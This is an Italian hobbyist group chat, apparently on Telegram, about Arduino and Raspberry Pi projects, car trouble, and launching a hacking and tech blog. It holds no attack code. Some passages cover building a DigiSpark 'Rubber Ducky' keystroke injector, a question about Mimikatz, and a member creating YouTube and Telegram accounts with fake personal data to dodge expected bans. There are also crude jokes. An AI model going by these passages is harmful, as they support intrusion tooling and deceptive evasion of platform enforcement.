L’unico modo che hai per cambiare indirizzo mac, che equivale al codice identificativo della scheda di rete, è cambiare scheda di rete. Se la scheda di rete fa parte di un unico blocco di componenti non puoi sostituirla.
-4?
Buondi! Qualcuno sa come posso e se posso risolvere questo problema al display di questa calcolatrice? Si spengono delle righe verticali, ma se non sbaglio non sono sempre le stesse che si spengono..
Cooooooooosa
Mi sanguinano gli occhi 
Stop
Era così per dire
^-1
Lo so che non è cosi e che c'è tutto un altro ragionamento dieteo
Quindi non uccidetemi
Si ma per farla semplice, per non tirare in ballo altre robe che tanto non credo gli interessano ho detto ELEVO
Quindi ok medaglia Fields non mi uccidete, vengo in pace
Ahahah ma non esiste nemmeno il nobel per la matematica
Davvero? Ero convinto di si
Esiste esiste
Nope
Non c'è
Perché Nobel pensava che la matematica non potesse portare il progresso dell'umanità
Damn ciccaaaa
Oltre la storia dell'amante
C'è la medaglia Fields però
Ma te stai in montagna 
Okkkayy
Ma non è un elevamento?
Nel senso se io elevo α alla numero negativo non ottengo il reciproco di α al valore assoluto della potenza?
Da noi il massimo è stato -2
Ahahahah
Ma il blog non doveva apparire il primo marzo?
Così risulta da geogebra: è corretto in teoria
Equazione di 2^x
Una passeggiata da me comporta un' ipotermia instantanea con glaciazione delle arterie e ibernazione
Temperatura perfetta per farsi qualche chilometro a piedi col giubbotto leggero
Dossati? 
Mmm non è un elevamento... Elevare alla meno 1 significa fare una divisione. Tipo x^-1 è 1/x.. Ma se fai il grafico di sin^-1 x e di (sinx)^-1 dono due cose diverse
Perché ^-1 è il simbolo che si usa anche per indicare l'inversa di una funzione
Coseno no?
Eh no
arcseno
No ma perché parlando con un amico mi disse di co-coseno e co-seno e cotangente, ma penso sbagliasse
Vabbé quindi con numeri si parla di elevamenti dopo divisione mentre con le trigonometriche cambia
Rosso seno, blu (sinx) ^-1, viola sin^-1x
Secante, cosecante e cotangente penso
Ok ci sta
Non ne ho idea 
Comunque grazie
🤔 hai provato a cambiare la batteria a bottone?
Nel frattempo
Gender politically correct
Il problema è che sul VoIP mi chiamo 
 lo stesso
Quindi🤷‍♂
Nono, è proprio un guasto generico al motore quella roba
E probabilmente (e auspicabilmente) è il manicotto della turbina
Ahahahahah
Romboli ma il sito non doveva uscire l'uno marzo?
Attento che cicca era uno dei suoi admin nel gruppo dei terrapiattisti 
* è
Oggi è il 28

Mi fai felice 
☺️☺️
Quanti vi manca?
E ti ho difeso con lui
Ti ha solo detto la data di oggi eh
Che ha detto? 
Voleva sapere se sei un tipo affidabile più o meno
Che a quanto pare è quella di apertura
Ma fammi capire una cosa....perché sei ancora dentro quel gruppo?
Lui dice le stronzate più assurde!
Perché gli voglio bene 
Secondo me è "serio"
Wtf?!
Nop
Potrei fare mille battute ma siamo in campagna elettorale quindi mi trattengo ☭
Praticamente ha detto "non avere fretta zio che la data di apertura è domani"
Comunque anche arancione è un finger in the ass, se la macchina non va 
Noooo, questa regola non la sopporto
Il simbolo del comunismo mhh interessante
. 
C'è la centralina in recovering mode, mi hanno spiegato... Usa solo valori medi di *qualcosa* e ti consente di arrivare a casa o al concessionario
Peccato che se casa è in collina non ci arrivi 
Ahahahah
è diesel?
Intanto in un mondo fatato
Si è suicidata la macchina alla fine
Yup
E non entra il turbo praticamente
Siamo arrivati per miracolo a casa mia

Arriva a 1800rpm e si impianta, incespica e perde putenza
mi sa che non ti alza il rapporto di compressione della turbina, per questo non entra in funzione
Secondo me è stato cicca a gufare, per far spendere i soldi in qualcosa di utile a Marco 
Minchia, sì
fa tipo rumore da trattore? funziona a 2 cilindri mi sa
Nono niente trattore 
potrebbe essere tante cose, devono collegarla alla diagnostica..potrebbe essere un tubo crepato nell'aspirazione, oppure la chiocciola della turbina, la centralina (
 prega che non siano ne turbina ne centralina), oppure un errore di sistema della centralina elettronica..bisogna collegarla all'OBD per la diagnostica e controllarla
allora non sono le candelette ne il common rail
 ma si accendeva?
Sisi
Ora sei anche meccanico? 
pff non hai idea di cosa vedo ogni giorno sui nostri mezzi

Faceva rumore?
Si può fare?
Niente di strano se non il morire quando saliva di giri
Quelli sono led?
Unica cosa che non ho controllato è se fumava strano
Era notte e non se vedeva, bucio di culo fessa pareva
cit.
Ma è turbo-diesel?
Conviene non accenderla, a mio zio si ruppe la turbina e il motore disse "ciao ciao"
Non ha Potenza senza di lei
Yup
Le turbine stavano solo sotto le diesel prima
Si
Nono non fumava
??
Ma il manicotto della turbina sarà in ghisa/alluminio non si può rompere
Niente, il casino che bisogna fare per questi display xD
Lo vorrei fare più grande
Peròm vedi se Arduino riesce a comandarli tutti
Tipo a me non può, assorbe 150mA ogni segmento
Anche a me è uno solo per Arduino
Ma non ce la fa comunque
Ma come, non sono led?
i manicotti della Hyundai sono in silicone
Questo potrebbe anche essere la centralina che taglia per non far ulteriori danni. Ma che auto è?
Si ma sono più potenti
E come faccio?
Devi vedere quanto assorbe ogni segmento
Deve essere meno di 40mA
Ok, vedrò
mi pare Hyundai i20
ix20
Filtro gasolio? Ormai sentire di cisterne piene di merda è all'ordine del giorno...
EGR?
Qua il meccanico dice che potrebbe essere semplicemente che col freddo si sia polimerizzato il gasolio, la centralina sia andata in recovering e che basti semplicemente farla ripartire dal loro tester
Esistono delle candelette di preriscaldamento
Possono essere quelle da cambiare
Non avete l'artico li?
Ma costa di più 
Quelle preriscaldavano senza problemi
Tieni il quadro acceso finché si spegne la spia delle candelette?
Macchè, lunedì sera ho fatto benzina a un distributore schifo perché stavo rimanendo per strada
Sempre
É quello
Mi si era spento da 10km il contatore dei km rimanenti 
Allaa mia povera moto si è distrutto l'iniettore, benzina di m-

Sei tu che non sai guidare
Puoi guidare... una volta è successo a mia mamma e dooo una settimana ha deciso di rifunzionare
Vogliono solo che tu vada a farti cambiare i pezzi x i SOLDI
Mmmh no..posso provare..non pensavo potesse dare questo genere di problemi..
Se la tensione scende può fare così
si può farlo
Buon pomeriggio, sapete perché la ricerca di librerie in codeblocks rimanga bloccata a waiting?
Qualcuno che usa Arduino su Linux?
Qualcuno bravo con woocommerce?
Qualcuno che non domandi continuamente? (Si scherza)
No
Una cosa mi serve 
Io uso arduino su raspbian quando capita
Lo installi normalmente con apt-get
Il mio problema è la COM port
Ecco lo sapevo
Le porte seriali sono incasinatissime
Che distro usi?
La COM è solo su windows
Adesso sono su live parrot
Ah quindi basato su debian
No
Che problena hai? Non trova la porta, non carica...?
Sembra un idiozia ma prova a cambiare porta USB
Sull'altra ho la USB con la live
Che COM port metto sull'ide?
A me ha funzionato accendendo il raspberry con già arduino collegato
Devi provatle tutte fino a che non riesce a caricare sull'arduino
Peccato che non mi fa selezionare COM port
Teoricamente dovrebbe farti vedere solo quella a cui sei connesso
Ah
Forse devi avviare l'ide con il root, quando fa così vuol dire che non riesce ad accedere alla porta ma la rileva
 to sfido a farlo funzionare
ma io manco so cosa sia un esp
Ma porca....
Almeno sai cos'è una COM port però

Ma seriamente
beh si ovvio
Come procede il microscopio?
Perché non mi compare la porta da scegliere allora?!
è il negativo del multimetro :DDD
ci stavo lavorando giusto ora
Beeelo
Tornio
gente, con keyboard.h, come faccio a scrivere le doppie virgolette se il comando funziona del tipo keyboard.print("comando da scrivere");
(""")
?
3 virgolette
Pero no
io mettendo /" sembra funzionare...ma non ne sono certo
Perche si chiudono all'inizio
devo testare ora
Forse dovresti printarlo direttamente col numero ASCII
intanto provo così
comunque....io con l'arduino posso controllare se un processo è aperto o chiuso sul pc?
in qualche modo?
Ssh o vnc?
Ah con arduino non so
cavetto usb
Devi vedere se c'e una libreria
già...intanto chiedevo se qualcuno ne conosce
Io no, ma forse solo una libreria non basta
o beh anche forse trasmissione a 2MHz che creo io con un pin analogico dell'arduino e una ricezione da gente malata che mi invento sempre io
C'e bisogno di un programma intercapedine fra il seriale e credo il task manager
MA AHAHAHAHAH
quando è un mese che tenti di capire cosa sbagli nel codice e poi capisci che in realtà il problema è dropbox ._.
vabb, idee su dove lo possa caricare perchè funzioni?
Qualcuno mi aiuta a creare eseguibili per linux di un programma python?
pastebin, GitHub
Hastebin
mmm...ok, poi provo, ora si studia matematica per la verifica di domani
Grazie
 ecco cosa volevo prendere
L'ho trovato in questo video 
 

Il range diventerebbe di quasi 10 km 
Menchia
Però non so se ne vale la pena vista la durata della batteria che ho
Nel senso che ho una LiPo da 3000 mAh e in 15 minuti non so quanto potrei andare lontano 
Considera che in "riserva" dovrebbe potersi fare 2km fino ad atterrare 
Ahhahahahahah
Ho fatto una stima molto approssimata e alla minchia. E mi risulta che con una batteria può fare 15 km
Però appena ho tempo la teorizzo bene, da vero scienziato
Non é male
Mehnz per 198 euro è fantastico 
Qualche graffietto sullo schermo ma non si notano neanche da acceso
C'è qualquadra che non cosa
il Thinkpad dell'asta?
Yessa
Sapete per caso dove vanno messi i pezzi in alto... io non ne ho idea...
Mi è arrivato che la scocca ghiacciata sembrava fosse trasportato in un furgone frigorifero hahahah
Con la retroilluminazione della tastiera 
a quel prezzo è ottimo
sono dei trattienicavo..una linguetta lunga va sotto il cavo, con i fori sopra i fori della plastica..le 2 piccole vanno una sul foro destro e l'altra sul sinistro, e l'altra linguetta serve a trattenere il cavo, quindi devi prima mettere il cavo sopra la linguetta inferiore e poi avvitarci la superiore sopra..sono trattienicavo a compressione
 Ma è normale
I pezzi uno abbracciano il filo (uno in un verso uno nell'altro) facendo da ponte tra i due buchi (ovviamente con le 2 viyi (3) i 2 buh guarda a cosa servono i buchi 2 sono prova fino a trovareilsenso
Ah emm no
Anzi si
Perché allungandosi stringe il filo (o almeno credo)
prova l'altra linguetta..magari si è leggermente deformata la plastica, succede con queste porte
Qualcuno mi può aiutare con la stampante?
Ask
No... nemmeno quell'altra ma poi ho provato a chiuderla con le linguette ma resta uno spiffero
🤔fammi una foto della prova
Praticamente ogni volta che devo stampare devo riavviare lo spooler di stampa dai servizi di windows
Non ne ho idea non mi è mai successo
Su internet non hai trovato niente??
Cioè volevo dire non si chiude proprio
Oppure le hanno messe a caso...
No
🤔anche senza utilizzare le linguette piccoline non chiude?
prova un attimo..altrimenti puoi provare ad usare solamente la stringicavo superiore e avvitarla solamente
Lungo tutto il bordo dello schermo c'è un gradino e nella fotocamera c'è il foro per la fotocamera... Non capisco se è una pellicola o proprio lo schermo fatto cosí
ho preso due volte consecutive la scossa vicino al raspberry :I
Il problema è proprio quello perché le linguette per il cavo sono più corte della scocca in plastica
 Ma è normale
qualcuno di voi ha provato osmc per raspi?
intendo come os
Si
tu?
guarda cosa succede quando lo flasho
e il raspi non parte
Cosa usi per flashare?
win32 disk imager
e ha funzionato con kali linux e con raspbian
prova a schiacciare leggermente la parte laterale con le dita mentre avviti..è chiaramente deformata quella plastica
Prova con etcher
Io ho sempre usato etcher e ha sempre funzionato
ok
comunque, in generale, come ti trovi con osmc
É fantastico, la UI é splendida ed é abbastanza responsivo, solo a volte ho problemi con dei plugin ma potrebbe essere che gli ho installati male io
Usi la versione "Krypton"?
non parte
non boota
ah... capito... ho scaricato quella per rpi0 



 
 avete visto?! Inoltre oggi c'è la live?
Non riesco a visualizzare la COM port
Qualche soluzione?
Ho provato con tutti i driver
Però ho notato che si due lati ci onora due pulsanti: al primo c'è scritto boot ed en, Al secondo flash e user
qando i messaggi dal gruppo del blog sono più di quelli dai Makers, cominci a preoccuparti
Vabbè ma adesso apre tra 18 ore quindi c'è tensione
top icona evah
Vorrei sapere chi l'ha disegnata
Ma questo è normale?
È possibile mettere un os tipo ubuntu in un tablet?
Se è Windows si🧐
Se è un galaxy tab 3? 
Nop
 alla fine sono riuscito... dovevo fermare il cavo in questo modo
E poi quelle altre servivano per la vite
Dopo sta roba elimino il voip
ma ma ma, almeno dare fuoco al telefono

Do fuoco ai server di telegram e risolviamo
Ma perché sto facendo tutto cio
Ah boh
Ma davvero ha la 3 media
Se è così si capisce tutto
Da notare patatina
Perché sai di poter far bingo
Nessun diploma.... ho la terza media... ma  ho avuto dei professori eccezionali..
Ecceziunal verament
Che può farti fare una risata, una droga, qualcosa che rilassa, crea assuefazione, nulla a che fare con la majurana
O semplicemente sto prendendo in giro un 30enne(?) che ha la 3° media
Non puoi sfuggire a questa droga
O farsi di droga vera?
Beh forse quello ti fa sfuggire
Cosa risolvi?
Finta assuefazione
Non ci guadagna nessuno
Lo spacciatore
E la mafia
Ne sei convinto?
Beh loro ci guadagnano
ottimo
No cari, avete capito male
L'unica droga è la risata
È sempre a portata di mano
La puoi usare sempre ma la usi raramente
Riesce a creare assuefazione
Si ma noi parliamo di droga intesa come stupefacenti, e lì ci guadagna la mafia e lo spacciatore
Ci avete mai pensato?
Abbiamo la droga migliore al mondo e non la usiamo
Però usiamo i social, quelli si che fanno bene, risatina malefica da dietro a un profilo online, che mondo
Uuuh
È oggettiva come cosa... Non tutti sono così

roba da 5 minuti con paint
5 minuti è pure troppo 
Si si dicono tutti così
E dovrebbe essere un offesa
Mi sono ispirato a grandi pittori per concepire l'icona che é poi volgarmente finita ad essere immagine di quel gruppo. Van Gogh, Picasso, Driss di "Quasi Amici" e, in particolare, Fistalloni.
No
Puppu
Vado a penetrare i server della google
Ciao
Allora ti piacerà questa opera d'arte


Wtf
  Per quale motivo il digiSpark Attiny 85 si disconnette e riconnette automaticamante, ed ha problemi con il caricamento del codice, nonostante i driver siano installati e le librerie sull'Arduino IDE?
Ho seguito questa guida, ma non va
Hai caricato prima lo sketch e poi inserito la board?
Nonostante dica "Caricamento Completato", la Rubber Ducky non sembra eseguire il codice...Inoltre si connette e si disconnette automanticamte
Si, ho seguito questa procedura
Mmmmm che sia messa male? non lo so
Non hai idea di come risolvere?
Nope sorry, a me no che sia difettosa o la porta o la board
Però non ho idee
Però mi sembra più un errore di installazione di qualche componente
Prova a rifare tutto da capo
va bene, grazie mille
che bello Marco che scrive 748462 cose da fare prima di domani 
Wow una conferenza
Voglio esserci anche io li dentro
Riconosco qualcuno
Io vedo un decimo di cicca
È cicca🧐
si beh siamo 1/2 team
Credo di sì
del blog, se non c'è Cicca chi c'è? 
Pare corrado
Buttata lì
Cicca c'è
madonna che stalker
comunque non è Corrado, stasera non poteva
BASTA devo andare a caricare articoli
Secondo me menti sapendo di mentuccia
E chi è?🧐
li ho coperti per qualcosa 
Ok
Ma qualsiasi cosa porta a welcome.html?
adesso sì, obv
Ma è finita la conferenza?
yup
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="
">here</a>.</p>
</body></html>
E non può essere nemmeno exploitato
hacking pesante industriale va la
Chi sa dirmi su arduino mega quali sono il positivo e negativo per alimentarlo a 12v?
Eeh il comando curl che è POTENTISSIMO
<a href> è troppo potentee
credo fermamente che se uno vuole iniziare a programmare,  l' HTML sia ottimale, sopratutto nella realizzazione di siti statici 
Che? Mi sa che non puoi alimentare arduino mega a 12v, forse sbaglio
Ma mica va a 12 volt
Forse a 9
9 si
Ma non gli si può buttare direttamente con 2 cavi 12v altrimenti lo bruci
Ah no in realtà si può
Come si aggiunge un altro account a Telegram? Non sono più capace di trovare il pulsante 
O forse c'è un massimo di 3
esatto
Si

Mimikatz fa danni se fatto girare per provare?
Posso spoilerarvi qualcosa del blog: siccome noi coder abbiamo praticamente finito, e anche i typer sono a posto con gli articoli, il lancio del blog é anticipato al 30 febbraio
Grandissimo 
posso rilassarmi allora
Chi sa dirmi quale e positivo e negativo dello spinotto rotondo di Arduino?
FROTTOLE! HO EFFETTUATO UNA SQL INJECTION E CE SCRITTO CHE LA PUBBLICAZIONE DEL SITO AVVERRÀ IL 31 APRILE!! 
 

puoi scaricare sia telegram che telegramX sullo stesso dispositivo e quindi puoi avere un account in più
e poi mettere parallel space
gente, con arduino leonardo, posso tipo far prendere un valore da tastiera, ma più che prenderlo fare tipo un bool tr=false; do{codice_bellino; if(tastopremuto && è stato premuto quel tasto la) tr=true;}while(tr)
Il tuo troll è talmente tanto demenziale che è demenziale anche per essere demenziale
Tipo quelli che scrivono "Pr1mo!1!1!1!"
pff, se fosse per me, io sarei abbastanza cinico da dire tipo "hey sarà rilasciato il primo di marzo"...*lo rilascia alle 23:59 del 1 marzo*
Magari fosse cosi
Avremmo più tempo per fare quello che ci manca
Ma il boss lo vuole online prima
triggered
ciao :)

PIÙUNNISSSIMO
avete le mani legate
anche i piedi
le mani no... altrimenti come lavorate al blog? 
una doanda... un mediacenter per cosa può essere usato?
vorrei vedere la tv o film in streaming ma non trovo gli add-on
Qualcuno con l's8+?
Il pin dentro è il positivo e intorno c'è il negativo
Infatti, quello che ho fatto
Perché ho creato un canale youtube con dati falsi per caricare i video di hacking del blog... e siccome avevo il numero di telefono VOIP vuoi non creare anche un account telegram? 
Che senso ha creare un blog per i video se poi sono sempre su yt?, a sto punto fai solamente il secondo canale e via
Non sarebbe meglio caricarli direttamente sul server del blog?
Solo hacking
Dove? Sul blog o su yt?
E il senso è che il canale dove ho pubblicato hacking mi verrà presto chiuso, immagino... ma il blog resta e basta cambiare gli url
Blog
Sul canale yt nascosto
E ricaricare tutti i video
Quale sarebbe?🤔 sono all'oscuro di tutto!
E dopo un tot di canale strikati mi sa che ti chiudono l'account google
(Credo)
Ne crei un'altro
Ma si, ci si mette un attimo... almeno non si perdono commenti e pubblico
Sisi per quello ho fatto un account nuovo con dati falsi
Ah shesh
Dillo quando arriverai a 100 episodi xD
(E poi tipo a yt non fregherá più niente di hacking e il blog sarà stato un lavoro inutile )
ma non c'è solo hacking nel blog, eh
coff..pedo-gore...coff
Vabehhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh
Ahahah
Gente abbiamo posticipato l'apertura di un giorno 
Pronti? 29 febbraio!
cit. non siamo italiani medi

Fake news
beh, il 29 febbraio esiste
fra 3 anni 
Febbraio ne ha 31
Non sapete la canzoncina? 30 giorni a novembre, con aprirle giugno e settembre... Di 28 non c'è nessuno e febbraio ne ha 31
Ho una buona notizia per te...... ordinanza del sindaco domani io a casa.....posso romperti anche domani 
Frango è il nostro sindaco
MA CAZZO A ME SERVIREBBE STARE A CASA DOMANI 
anche a me
Nevica,magari chiudono di nuovo boh 🤔
Già 3 giorni a casa
A Roma no
Da non non c'è neve 
se stessi a casa domani avreste un blog con 20 articoli in più, per dire
beati voi
Però abbiamo l'ordinanza
io ieri oggi e domani sto a casa e firse anche venerdi
Venite a vivere in Basilicata
Ma ne vogliamo parlare?
Ma io sono a Marilleva 1400, e il problema non si pone perché non ci sono scuole pubbliche, solo scuole sci e snowboard.

vengo a vivere la allora
Potresti scrivere un articolo di hacking come blogghista in prova, se sei ancora interessato 
Su cosa?
Ho conoscenza limitate, ma vediamo cosa posso fare
VAI CHE NE MANCA UNO 
Posso scrivere qualcosa tipo sulle basi o sul sistema operativo da utilizzare o non serve? 
 
posso stalkerarti in privato?
Ma certo
Ce ne manca solo uno, ma in realtà ti darei il via domani quando il blog è già online così puoi dare un'occhiata allo stile che stiamo seguendo
oppure lo metto nei typer e gli passo taaanti screen
Ma il blog sarà disponibile da mezzanotte?
Se ti seguo è anche perché sono inesperto, quindi VPN, proxy, Mac adddress e Via dicendo si, sul resto bacillo
probably not
Se volete una mano sono qui
Come volete
Ah ok
Vogli prima vederlo per skype come voi ahhah
ooki
Sennò penso chiunque quàddentro si offrirebbe per scrivere articolozzi 
Mmmh probabilemnte durante la notte
Massimo 7 di domattina
Che hai contro i 14enni? 
ma
Capisco...
Va bene
Ah okk
I dati son ttti diversi
e da come scrive Marco si capisce quanta ansia abbiamo in questo momento
Ahahahahah
e viecce
Lol
Ora la mano mi banna
"a me piace la patatina"

Si sentirà offesa dall'oltragio che hai fatto contro la figura femminile
Per chi l'avesse perso
Ma
.
Hahahahahahahahaahahahahajaha
Non ditegli niente
Pensa che sono una persona molto educata
E che non sappia dei suoi meme
Lo spero
Ok raga io vado a fare cose con la manina.. perché come dice arcobaiter a me piace la patatina
COOOSA ti buttano dentro? 
Ho detto che sono impegnato
Poi se entro devo dire almeno qualcosa
Ma chi è arcobaiter?
porc, ci provo io che gli ho dato del mongoflettico e vediamo cosa mi dice?
Fate finta che questi screen e che io non esista
una brava persona
Mitico 
Hi
Vorrei dire una cosa sul funzionamento della DigiSpark per la Rubber Ducky: la libraria DigiKeyboard.h non contiene molte cose (tra cui la mappatura delle frecce direzionali e molti caratteri che non vengono riconosciuti anche con l'escape (don't know why)). Per fixare questo problema bisogna vedere ogni carattere come una sequenza di tasti (ogni tasto strano tipo il punto sono da mappare e ci sono le definizioni in giro online)
Zalve
k
Lovu
Magari se si definisce la codifica in UTF-8 si può usare l'escape, non so
e, a poche ore dal lancio del blog...
bene, per il blog non esisto più, a quanto pare
good job, Drupal 
yeah
il bello della diretta
Meglio di quella roba che tutti usano che non mi ricordo come si chiama
WordPress
AHAHAH la nostra scuola ha il sito in wordpress e il non responsive del sito copre il banner pubblicitario
Ekkolo
Coff coff
e i bottoni da mobile non si premono, credo li abbiano proprio esclusi dal """"responsive"""""
Fidati che Drupal family cagare comunque
Facevamo prima a farci un CMS da zero da quanti problemi abbiamo avuto
Raga ma a mezzanotte esce?
Altrimenti vado a nanna
HAHAHAHA bella battuta ._.
🤔
Vai vai pure
Le uniche cose che escono sono le Madonne dalla mia bocca appunto perché Drupal é un problema dietro l'altro
qui se finiamo prima delle 5 è un miracolo
o un ban dietro l'altro? 
Pomeriggio
nono, mattina
5:00 am
Ahhh

Non dormite oggi?
eeeh non sappiamo 
attenzione che il romboli vi licenzia 
Nel dubbio fatevi un bel po' di caffè
O di Red bull........vi mette le ali!
☕
-2 minuti al niente 
aaa quetti bag
ricordo febbraio come fosse ieri....
Madoo
ricordo febbraio come fosse...
CAZZO È GIÀ MARZO
Un warn te lo meriteresti
🤣🤣
Ragaa sono tristissimo
Ho rotto la porta micro USB del telefono
Merda
almeno carica?
Con la QC non ne vuole sapere, si stacca e attacca in continuazione la ricarica
Con un alimentatore non QC carica lentissimo, con un'app sto vedendo che non supera i 500mA
Ma come hai fatto?
E ovviamente il PC non lo vede
Vediti le iene
Bagnetto
Caduto nella neve?
No
Nel lavandino
Ahahahahahah
Non ci credo 
Mettilo nel riso
._.
mettilo nell'ahahahah
È l'unica soluzione che mi viene in mente oh
ok esco
Ecco, bravo

che telefono?
1. Non cambia niente
2. Lo sto caricando anche se malissimo ora
3. TI PARE CHE HO IL RISO? Ok che è un residence e c'è il cucinino ma...
Col cazzo
Non è un hotel?
Cosa? Lo stai caricando dopo la caduta?
Me lo tengo così per due motivi
1. Mi fanno schifo tutti i telefoni sul mercato
2. Ho solo 300€ da poter spendere
Xiaomi mi A1 
Eh per forza
Ma con quella camera? Te lo scordi
Ma si scem?!
Poi non è amoled
Gcam
Ma è stabilizzato a culo
mi note 3
È sempre un piacere parlare con te
Non è un po' datato?
Nah
il look è un po' anacronistico, però in quanto a performance è il top imho
Se proprio dovessi... Prenderei OnePlus
Up
Ma si scem?
L'anti sicurezza
Però dovrei cambiare operatore perché il 5/5t non va col 3G di Wind
?
Dimenticalo one plus
Che ha fatto
Quello che sta succedendo sul sito dice molto
Ma delle carte di credito?
L' anti sicurezza
Scialla oh può succedere a tutti
Mica solo quello!
E che altro mi sono perso?
Ma che stai dicendo?
Hanno fatto uno sbaglio dopo l'altro in sicurezza
Che è successo anche a noi ma zitto.
??
Però l'unica cosa che sono riusciti a rubarci è stata la lista di username degli utenti 
Tra bug e problemi sulla sicurezza davvero no comment
Spiegati meglio
Se lo dici tu... E che altro rimane
Niente tranquillo, ci hanno provato a rompere il sito
Continua che la storia è diventata interessante 
Sito di?
Un'azienda che non cito
Switchando?
Anzi, su quello francese sono riusciti a entrare in FTP non si sa come, bell'host netsons...
Mi era già successo, e poi boh con un altro bagnetto si era ripreso
 giusto per dirti.....hanno scoperto in OnePlus che mandavano i dati a aliexpress
Modding? Finché non bricko
Quanto mi piacciono queste cose 
Gente, abbiamo finalmente aperto il sito in strano anticipo.

A noi no.
non va
Ma dai! Sono bellissime! Intrigano la mente!
Ma muori
leggi cosa esce scritto 
ah, se vai da wifi ti esce una cosa bella
Tante speranza...
ho visto simpaticone
apri questo 
 ❤️
Ma non ci penso proprio
no beh non fa nulla
La cosa preoccupante è che ci stai pure perdendo tempo 
per un minuto 
Sono appassionato di fotografia però non ho sbatti di girare con la macchina
Ah sì?
Perciò cerco un buon cameraphone, com'è il mio S6
Epic fail
Ho anche la rosa così
Che è il Mi A1?
Mi note 3
Mi A1 la foto del lego e l'ultima foto, il resto iPhone 5c
Fate night?
Vi lascio lavorare
Ahahaha
Allora siete vivi!!
A che punto state?
abbiamo finito adesso di caricare gli articoli di hacking, stiamo sistemando le ultime cose
Perfetto 
Online finalmente...
Fino a che non vado a nanna potrebbero succedere cose strane
Complimenti Marco, bel blog, continua con questo entusiasmo 
Belli sti test
Uhs
Hahahaha sshhhhh
 evidentemente non sparivano, Google mentiva 
Te l'avevo detto io
 vabbè dai è un bel lavoro...
Uff sto impazzendo
Buooongiorno guyz! ❤️
Vi piace il blog?
Ci è la nievaaaaaaaaaaaaaa❤️❤️
Lo soooo 
Beh gente, come minimo io direi che per nevicare qua deve accadere una catastrofe quindi posso stare a casa e non andare a scuola a fare la verifica di matematica
blog molto carino, ma segnalo questo bug da mobile
o almeno credo sia un bug, perché come cosa è veramente brutta
Va benissimo lo stesso, me lo invii per posta il mio quartino?
(non avevo lo spumante, spero vada bene lo stesso )
Belo bello però c'è un bug nella pagina deep learning, non carica la foto profilo
Bellissimo!
Non so se questo problema si verifichi solo sul mio telefono, ma le immagini sono tagliate...
grazie mille ❤️
Ma perché su occorrente non si vede la foto??
Ah boh
Metti il sito desktop perchè anche il mio dal cell fa così
Marco non l'ha ancora messa 
Scusateci, ma lavorando fino alle 2 di notte capita che ci si dimentichi qualcosa
thanks again ❤️
Vi capiamo...
perchè non serve niente in quell'articolo, quindi esce bianca
Ah gente, se dovete segnalare bug non fatelo qui che magari ci perdiamo qualcosa, se andate sulla pagina Contatti trovate la sezione per segnalarci tutte le cose che trovate in giro
I know, stiamo debuggando per voi❤️
Ma comunque non va lasciata cosi... perché è esteticamente brutta...
effettivamente 
Ha scritto così perchè, creando i template per gli articoli e dovendo scrivere qualcosa, avevo scritto "Ascoltatevi Pizza di Martin Garrix" 

in uno avevo scritto "Cicca sei bello"
dovremo fare un canale con "Dietro le quinte: segreti del blog" dove inoltriamo i momenti più divertenti
Sbaglio o manca il 1° episodio?
Yup, non l'abbiamo fatto perchè è solo di introduzione e non c'era moltissimo di utile
metà del video è solo per installare l'IDE, cosa che in un articolo tu occupa due righe
Ciao come state
Non parlando del blog
WTF
In realtà è ancora offline
sei ancora su 
.html 
E del 9, 10, 11, 12, 13, 14, 15??
Tranquillo, lo sappiamo  fixiamo oggi
Ma anche io ho cancellato 'welcome.html'
sono scritti, bisogna caricarli

Vabbè comunque ho ricaricato la pagina senza '
.html' e funziona
Non è finito così il blog eh, ci sono ancora un botto di articoli in lista oppure che sono solo da uploadare
Ma il TV b gone come faccio a farlo funzionare su Arduino mkr1000? Quando carico il programma da errore di avr
Librerie?
Al massimo è la corrente ad essere inversamente proporzionale. A parità di tensione, una resistenza maggiore implica una corrente inferiore
Oltre a te chi ci sta lavorando al sito?
segnalalo nei commenti 












 








 ❤️
Ook! Ottimo lavoro ragazzi!
thanks ❤️❤️
Vedete se a voi va 
Marco ha un titolo bellissimo
non c'è niente di domotica, è nella coda 
Ahhh a posto, non potete nasconderla nel frattempo? 
a certi lo fa 🤔
il problema è che è nella barra in alto 
Ah gente, se dovete segnalare bug non fatelo qui che magari ci perdiamo qualcosa, se andate sulla pagina Contatti trovate la sezione per segnalarci tutte le cose che trovate in giro
Hahaha me la sono dimenticata
Si certo, ma volevo solamente capire se succedeva anche ad altri
È pseudobormale non vada
La barra ha problemi, viene tagliata su schermi piccoli
Quella in alto? La puoi scrollare
Ah, visto ora che scorre... Se non avessi provato per intuizione non ci sarei mai arrivato. Magari mettere qualche effetto grafico per far capire che scorre non sarebbe male
Up
 
 non fa
Grazie
Ma per queste segnalazioni bug non scrivete a 
prego

Dimenticavo il fix è per safari mobile e non
Ah perfetto!
Scusa nel mobile va messo "width: 100vw;"
Lovu
哦，狗屎 non l'ho creata
Adesso arriva un account telefram per le segnalazioni.
Buongiorno, qualcuno sa come funziona la garanzia di GearBest per gli smartphone Xiaomi? Mi stanno tentando Essendoci anche su Amazon pero..di Amazon mi fido, rendo e cambio come voglio. Su GearBest come funzionerebbe? Posso rendere anche li? Se non funziona, con i tempi di che ordini di grandezza parliamo?
Grazie mille
Pinnate questo
Ho visto adesso il blog, davvero molto bello, complimenti!
La lunghezza d'onda
ottimo blog
Buongiorno
Giornoo
Kaffee?
(sarebbe già il terzo)
sei in uni? in caso vengo a prendere il secondo 
Uh sisi
Tra dieci minuti a povo 1 primo piano?
visto che è sempre un casino: con primo piano intendi quello con le aule A2xx  o quello sopra?
Quello con le A2xx


Il secondo titoletto in contatti presenta una disattenzione
Thanks
 che bici hai?
Le segnalazioni fatele a 
 please
Che altrimenti qui le perdiamo
Nell'articolo Rubber Ducky il collegamento è sbagliato
Rara immagine di un qualsiasi articolo del blog 5 minuti prima del deploy (2018, colorized)
     
❤️
idem, terzo di oggi che prendo
Pff, io già preso il quarto
Scarso
HAHAHAHAHAHAH
Bello il blog ragazzi! Ottimo lavoro
❤️
Caterpillar®
C'erano tutte le macchine piantate di traverso in salita a mettere le catene e io che slalomavo 
Che atleta 
Fino a che ora avete lavorato ieri ?
Oggi*
Marco e Cicca fino alle 2 almeno
Voi?
Che bello... Chiudono la scuola per neve e mi tocca farmi 3 km a piedi... Evviva
3
E mezza
Vi siete divertiti dai

Non capisco
Ultimo messaggio era delle 27, ma poi tra andare in bagno e guardare breaking italy...
La libreria keyboard è gia inclusa nell ide..
